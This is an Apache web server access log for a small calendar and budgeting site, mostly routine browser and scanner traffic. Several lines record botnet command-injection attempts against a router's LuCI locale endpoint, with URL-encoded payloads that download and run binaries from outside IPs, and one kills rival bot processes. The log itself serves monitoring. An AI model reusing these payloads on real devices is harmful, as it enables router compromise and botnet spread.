211.36.140.97 - - [27/Jun/2024:13:27:19 +0000] "GET /favicon.ico HTTP/1.1" 200 269374 "http://www.junghomun.com/user/login" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.33 - - [27/Jun/2024:13:27:13 +0000] "GET /static/js/main.4cede9ec.js.map HTTP/1.1" 200 58128031 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.33 - - [27/Jun/2024:13:28:14 +0000] "GET /user/login HTTP/1.1" 200 748 "-" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.33 - - [27/Jun/2024:13:28:15 +0000] "GET /static/css/main.22ac65e9.css HTTP/1.1" 200 367042 "http://www.junghomun.com/user/login" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.33 - - [27/Jun/2024:13:28:16 +0000] "GET /static/css/main.22ac65e9.css.map HTTP/1.1" 200 628227 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.33 - - [27/Jun/2024:13:28:16 +0000] "GET /static/js/main.4cede9ec.js HTTP/1.1" 200 38572893 "http://www.junghomun.com/user/login" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
185.191.127.212 - - [27/Jun/2024:13:28:31 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 404 224 "-" "Go-http-client/1.1"
106.102.11.33 - - [27/Jun/2024:13:28:32 +0000] "GET /static/media/user1.fa046da15e89a4780c33.webp HTTP/1.1" 200 34369 "http://www.junghomun.com/user/login" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.33 - - [27/Jun/2024:13:28:32 +0000] "GET /favicon.ico HTTP/1.1" 200 269374 "http://www.junghomun.com/user/login" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.33 - - [27/Jun/2024:13:28:32 +0000] "GET /static/js/main.4cede9ec.js.map HTTP/1.1" 200 58128031 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.36.140.97 - - [27/Jun/2024:13:38:54 +0000] "GET /user/login HTTP/1.1" 200 748 "-" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
211.36.140.97 - - [27/Jun/2024:13:38:55 +0000] "GET /static/css/main.22ac65e9.css HTTP/1.1" 200 367042 "http://www.junghomun.com/user/login" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
211.36.140.97 - - [27/Jun/2024:13:38:56 +0000] "GET /static/css/main.22ac65e9.css.map HTTP/1.1" 200 628227 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.33 - - [27/Jun/2024:13:38:55 +0000] "GET /static/js/main.196ee694.js HTTP/1.1" 200 38573089 "http://www.junghomun.com/user/login" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.33 - - [27/Jun/2024:13:39:05 +0000] "GET /static/media/user1.fa046da15e89a4780c33.webp HTTP/1.1" 200 34369 "http://www.junghomun.com/user/login" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.33 - - [27/Jun/2024:13:39:06 +0000] "GET /favicon.ico HTTP/1.1" 200 269374 "http://www.junghomun.com/user/login" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.33 - - [27/Jun/2024:13:39:09 +0000] "GET /static/media/logo2.67bbeba334a6dba22186.webp HTTP/1.1" 200 259014 "http://www.junghomun.com/calendar/list" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.33 - - [27/Jun/2024:13:39:09 +0000] "GET /static/media/calendar1.89c348a3ad43be2a45b9.webp HTTP/1.1" 200 12120 "http://www.junghomun.com/calendar/list" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
211.36.140.97 - - [27/Jun/2024:13:39:09 +0000] "GET /static/media/logo3.b1396c753a537eb57950.webp HTTP/1.1" 200 49654 "http://www.junghomun.com/calendar/list" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.33 - - [27/Jun/2024:13:39:09 +0000] "GET /static/media/sleep1.d40c2a1bc215a195d75e.webp HTTP/1.1" 200 13994 "http://www.junghomun.com/calendar/list" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.33 - - [27/Jun/2024:13:39:09 +0000] "GET /static/media/money1.916f5b63580b041e485a.webp HTTP/1.1" 200 13072 "http://www.junghomun.com/calendar/list" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.33 - - [27/Jun/2024:13:39:09 +0000] "GET /static/media/smile3.6afb782045251fc93c24.webp HTTP/1.1" 200 5092 "http://www.junghomun.com/calendar/list" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.33 - - [27/Jun/2024:13:39:10 +0000] "GET /static/media/money4.bab943b0cc9204eca042.webp HTTP/1.1" 200 25193 "http://www.junghomun.com/calendar/list" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.33 - - [27/Jun/2024:13:39:10 +0000] "GET /static/media/food1.bc88ff497f3bb08cf0a7.webp HTTP/1.1" 200 21818 "http://www.junghomun.com/calendar/list" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.33 - - [27/Jun/2024:13:39:10 +0000] "GET /static/media/exercise1.0fbc1a440efd979a68eb.webp HTTP/1.1" 200 7554 "http://www.junghomun.com/calendar/list" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.33 - - [27/Jun/2024:13:39:05 +0000] "GET /static/js/main.196ee694.js.map HTTP/1.1" 200 58128581 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
::1 - - [27/Jun/2024:13:39:18 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) (internal dummy connection)"
106.102.11.33 - - [27/Jun/2024:13:39:19 +0000] "GET /static/media/common2.869688a6bd521f6416dc.webp HTTP/1.1" 200 6832 "http://www.junghomun.com/calendar/save" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.33 - - [27/Jun/2024:13:39:19 +0000] "GET /static/media/common1.7c741a6f0a021e66a3be.webp HTTP/1.1" 200 8012 "http://www.junghomun.com/calendar/save" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.33 - - [27/Jun/2024:13:39:19 +0000] "GET /static/media/smile1.e1d275084022ed4384d8.webp HTTP/1.1" 200 5966 "http://www.junghomun.com/calendar/save" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.33 - - [27/Jun/2024:13:39:20 +0000] "GET /static/media/calendar2.860ea4d068a4a80e6637.webp HTTP/1.1" 200 7962 "http://www.junghomun.com/calendar/save" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.33 - - [27/Jun/2024:13:39:20 +0000] "GET /static/media/calendar3.a18ee7749f4008a6585e.webp HTTP/1.1" 200 6070 "http://www.junghomun.com/calendar/save" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
59.183.169.9 - - [27/Jun/2024:13:40:17 +0000] "GET / HTTP/1.1" 200 748 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
106.102.11.33 - - [27/Jun/2024:13:41:41 +0000] "GET /static/media/common3_1.9d98ba7e31f409e5b48f.webp HTTP/1.1" 200 4422 "http://www.junghomun.com/money/dash/list" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.33 - - [27/Jun/2024:13:41:41 +0000] "GET /static/media/common3_2.8f0a0f8bd6052da1ac43.webp HTTP/1.1" 200 2901 "http://www.junghomun.com/money/dash/list" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.33 - - [27/Jun/2024:13:43:37 +0000] "GET /static/media/common3_1.9d98ba7e31f409e5b48f.webp HTTP/1.1" 304 - "http://www.junghomun.com/money/dash/list" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.33 - - [27/Jun/2024:13:43:37 +0000] "GET /static/media/common3_2.8f0a0f8bd6052da1ac43.webp HTTP/1.1" 304 - "http://www.junghomun.com/money/dash/list" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
172.105.128.11 - - [27/Jun/2024:13:49:31 +0000] "\x16\x03\x01" 400 226 "-" "-"
117.207.59.225 - - [27/Jun/2024:14:00:01 +0000] "GET / HTTP/1.1" 200 748 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
139.59.101.104 - - [27/Jun/2024:14:08:15 +0000] "GET /cdn-cgi/trace HTTP/1.1" 200 748 "-" "Mozilla/5.0"
45.83.65.123 - - [27/Jun/2024:14:13:46 +0000] "GET / HTTP/1.1" 200 748 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0"
45.83.64.180 - - [27/Jun/2024:14:13:46 +0000] "GET /favicon.ico HTTP/1.1" 200 269374 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0"
185.191.127.212 - - [27/Jun/2024:14:30:24 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 404 224 "-" "Go-http-client/1.1"
167.94.145.97 - - [27/Jun/2024:14:50:38 +0000] "GET / HTTP/1.1" 200 748 "-" "-"
167.94.145.97 - - [27/Jun/2024:14:50:41 +0000] "GET / HTTP/1.1" 200 748 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.145.97 - - [27/Jun/2024:14:50:41 +0000] "PRI * HTTP/2.0" 400 226 "-" "-"
167.94.145.97 - - [27/Jun/2024:14:50:42 +0000] "GET /favicon.ico HTTP/1.1" 200 269374 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
141.98.83.197 - - [27/Jun/2024:15:27:14 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60for+proc_dir+in+%2Fproc%2F%5B0-9%5D%2A%3B+do+pid%3D%24%7Bproc_dir%23%23%2A%2F%7D%3B+buffer%3D%24%28cat+%22%2Fproc%2F%24pid%2Fmaps%22%29%3B+if+%5B+%22%24%7B%23buffer%7D%22+-gt+1+%5D%3B+then+if+%5B+%22%24%7Bbuffer%23%2A%22%2Flib%2F%22%7D%22+%3D+%22%24buffer%22+%5D+%26%26+%5B+%22%24%7Bbuffer%23%2A%22telnetdbot%22%7D%22+%3D+%22%24buffer%22+%5D%3B+then+kill+-9+%22%24pid%22%3B+fi%3B+fi%3B+done%60) HTTP/1.1" 404 224 "-" "Go-http-client/1.1"
141.98.83.197 - - [27/Jun/2024:15:27:14 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F45.148.10.78%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk%60) HTTP/1.1" 404 224 "-" "Go-http-client/1.1"
185.224.128.74 - - [27/Jun/2024:15:28:24 +0000] "GET / HTTP/1.1" 200 748 "-" "Hello World"
80.82.77.202 - - [27/Jun/2024:15:45:39 +0000] "GET / HTTP/1.0" 200 748 "-" "Mozilla/5.0 (Linux; Android 4.4.2; GT-N8000) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Safari/537.36"
45.156.129.48 - - [27/Jun/2024:15:54:27 +0000] "GET /js/NewWindow_2_all.js HTTP/1.1" 200 748 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
106.102.11.33 - - [27/Jun/2024:16:03:08 +0000] "GET / HTTP/1.1" 200 748 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.33 - - [27/Jun/2024:16:03:08 +0000] "GET /static/css/main.b87daa8b.css HTTP/1.1" 200 366783 "http://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.33 - - [27/Jun/2024:16:03:08 +0000] "GET /static/js/main.eb5fbb28.js HTTP/1.1" 200 38576139 "http://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.33 - - [27/Jun/2024:16:03:28 +0000] "GET /static/media/logo2.67bbeba334a6dba22186.webp HTTP/1.1" 200 259014 "http://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.33 - - [27/Jun/2024:16:03:28 +0000] "GET /static/media/money4.bab943b0cc9204eca042.webp HTTP/1.1" 200 25193 "http://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.33 - - [27/Jun/2024:16:03:28 +0000] "GET /static/media/exercise1.0fbc1a440efd979a68eb.webp HTTP/1.1" 200 7554 "http://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.36.140.44 - - [27/Jun/2024:16:03:28 +0000] "GET /static/media/smile3.6afb782045251fc93c24.webp HTTP/1.1" 200 5092 "http://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.33 - - [27/Jun/2024:16:03:28 +0000] "GET /static/media/logo3.b1396c753a537eb57950.webp HTTP/1.1" 200 49654 "http://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.33 - - [27/Jun/2024:16:03:28 +0000] "GET /static/media/user1.fa046da15e89a4780c33.webp HTTP/1.1" 200 34369 "http://www.junghomun.com/user/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.33 - - [27/Jun/2024:16:03:28 +0000] "GET /static/media/food1.bc88ff497f3bb08cf0a7.webp HTTP/1.1" 200 21818 "http://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.33 - - [27/Jun/2024:16:03:29 +0000] "GET /static/media/calendar1.89c348a3ad43be2a45b9.webp HTTP/1.1" 200 12120 "http://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.33 - - [27/Jun/2024:16:03:29 +0000] "GET /static/media/money1.916f5b63580b041e485a.webp HTTP/1.1" 200 13072 "http://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.33 - - [27/Jun/2024:16:03:29 +0000] "GET /static/media/sleep1.d40c2a1bc215a195d75e.webp HTTP/1.1" 200 13994 "http://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.36.140.44 - - [27/Jun/2024:16:03:29 +0000] "GET /favicon.ico HTTP/1.1" 200 269374 "http://www.junghomun.com/user/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
::1 - - [27/Jun/2024:16:03:35 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) (internal dummy connection)"
106.102.11.33 - - [27/Jun/2024:16:03:36 +0000] "GET /static/css/main.b87daa8b.css HTTP/1.1" 304 - "http://www.junghomun.com/calendar/list" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.33 - - [27/Jun/2024:16:03:37 +0000] "GET /static/css/main.b87daa8b.css.map HTTP/1.1" 200 627897 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.33 - - [27/Jun/2024:16:03:39 +0000] "GET /static/media/smile1.e1d275084022ed4384d8.webp HTTP/1.1" 200 5966 "http://www.junghomun.com/money/dash/list" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.33 - - [27/Jun/2024:16:03:39 +0000] "GET /static/media/common3_2.8f0a0f8bd6052da1ac43.webp HTTP/1.1" 200 2901 "http://www.junghomun.com/money/dash/list" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.33 - - [27/Jun/2024:16:03:39 +0000] "GET /static/media/common3_1.9d98ba7e31f409e5b48f.webp HTTP/1.1" 200 4422 "http://www.junghomun.com/money/dash/list" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.33 - - [27/Jun/2024:16:03:41 +0000] "GET /static/media/common1.7c741a6f0a021e66a3be.webp HTTP/1.1" 200 8012 "http://www.junghomun.com/money/diff/list" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.33 - - [27/Jun/2024:16:03:41 +0000] "GET /static/media/money2.62a2247e71af2184cd98.webp HTTP/1.1" 200 21102 "http://www.junghomun.com/money/diff/list" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.33 - - [27/Jun/2024:16:03:45 +0000] "GET /static/media/common2.869688a6bd521f6416dc.webp HTTP/1.1" 200 6832 "http://www.junghomun.com/money/goal/save" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.33 - - [27/Jun/2024:16:03:37 +0000] "GET /static/js/main.eb5fbb28.js.map HTTP/1.1" 200 58128572 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.33 - - [27/Jun/2024:16:03:53 +0000] "GET /static/media/calendar3.a18ee7749f4008a6585e.webp HTTP/1.1" 200 6070 "http://www.junghomun.com/money/save" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
185.191.127.212 - - [27/Jun/2024:16:11:58 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 404 224 "-" "Go-http-client/1.1"
106.102.11.3 - - [27/Jun/2024:16:13:47 +0000] "GET / HTTP/1.1" 200 748 "-" "Mozilla/5.0 (Linux; Android 13; sdk_gphone_x86_64 Build/TE1A.220922.034; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36"
106.102.11.3 - - [27/Jun/2024:16:13:47 +0000] "GET /static/css/main.b87daa8b.css HTTP/1.1" 200 366783 "http://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 13; sdk_gphone_x86_64 Build/TE1A.220922.034; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36"
106.102.11.3 - - [27/Jun/2024:16:13:47 +0000] "GET /static/js/main.8d2795c4.js HTTP/1.1" 200 38575867 "http://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 13; sdk_gphone_x86_64 Build/TE1A.220922.034; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36"
106.102.11.3 - - [27/Jun/2024:16:14:11 +0000] "GET /static/media/logo2.67bbeba334a6dba22186.webp HTTP/1.1" 200 259014 "http://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 13; sdk_gphone_x86_64 Build/TE1A.220922.034; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36"
106.102.11.3 - - [27/Jun/2024:16:14:11 +0000] "GET /static/media/sleep1.d40c2a1bc215a195d75e.webp HTTP/1.1" 200 13994 "http://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 13; sdk_gphone_x86_64 Build/TE1A.220922.034; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36"
211.36.140.105 - - [27/Jun/2024:16:14:11 +0000] "GET /static/media/calendar1.89c348a3ad43be2a45b9.webp HTTP/1.1" 200 12120 "http://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 13; sdk_gphone_x86_64 Build/TE1A.220922.034; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36"
106.102.11.3 - - [27/Jun/2024:16:14:11 +0000] "GET /static/media/money1.916f5b63580b041e485a.webp HTTP/1.1" 200 13072 "http://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 13; sdk_gphone_x86_64 Build/TE1A.220922.034; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36"
106.102.11.3 - - [27/Jun/2024:16:14:12 +0000] "GET /static/media/user1.fa046da15e89a4780c33.webp HTTP/1.1" 200 34369 "http://www.junghomun.com/user/login" "Mozilla/5.0 (Linux; Android 13; sdk_gphone_x86_64 Build/TE1A.220922.034; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36"
106.102.11.3 - - [27/Jun/2024:16:14:12 +0000] "GET /static/media/logo3.b1396c753a537eb57950.webp HTTP/1.1" 200 49654 "http://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 13; sdk_gphone_x86_64 Build/TE1A.220922.034; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36"
106.102.11.3 - - [27/Jun/2024:16:14:12 +0000] "GET /static/media/smile3.6afb782045251fc93c24.webp HTTP/1.1" 200 5092 "http://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 13; sdk_gphone_x86_64 Build/TE1A.220922.034; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36"
211.36.140.105 - - [27/Jun/2024:16:14:12 +0000] "GET /static/media/money4.bab943b0cc9204eca042.webp HTTP/1.1" 200 25193 "http://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 13; sdk_gphone_x86_64 Build/TE1A.220922.034; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36"
106.102.11.3 - - [27/Jun/2024:16:14:12 +0000] "GET /static/media/exercise1.0fbc1a440efd979a68eb.webp HTTP/1.1" 200 7554 "http://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 13; sdk_gphone_x86_64 Build/TE1A.220922.034; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36"
106.102.11.3 - - [27/Jun/2024:16:14:12 +0000] "GET /static/media/food1.bc88ff497f3bb08cf0a7.webp HTTP/1.1" 200 21818 "http://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 13; sdk_gphone_x86_64 Build/TE1A.220922.034; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36"
::1 - - [27/Jun/2024:16:14:19 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) (internal dummy connection)"
::1 - - [27/Jun/2024:16:14:20 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) (internal dummy connection)"
::1 - - [27/Jun/2024:16:14:21 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) (internal dummy connection)"
::1 - - [27/Jun/2024:16:14:22 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) (internal dummy connection)"
211.36.140.40 - - [27/Jun/2024:16:14:47 +0000] "GET / HTTP/1.1" 200 748 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
